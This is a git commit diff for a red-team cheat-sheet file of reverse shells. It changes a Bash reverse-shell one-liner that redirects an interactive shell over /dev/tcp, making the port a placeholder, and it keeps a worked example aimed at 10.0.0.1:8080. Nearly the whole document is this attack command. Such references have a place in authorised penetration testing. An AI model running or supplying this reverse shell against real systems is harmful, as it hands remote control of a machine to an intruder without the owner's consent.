69437dd14a27054442976d6d0f340cbe81fb3c4f
Matt T <85061655+Mattluna@users.noreply.github.com>
2026-09-22 08:49:46 -0400

    Modify Bash reverse shell to use variable port
    Updated script to allow dynamic port configuration.

--- Red_team/Reverse_Shells/Bash.sh
+++ Red_team/Reverse_Shells/Bash.sh
@@ -1,5 +1,5 @@
-Replace {IP} with your IP 
+# Replace {IP} with your IP and set port to your listening port
 
-bash -i >& /dev/tcp/{IP}/8080 0>&1
+bash -i >& /dev/tcp/{IP}/{port} 0>&1
 
 example: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
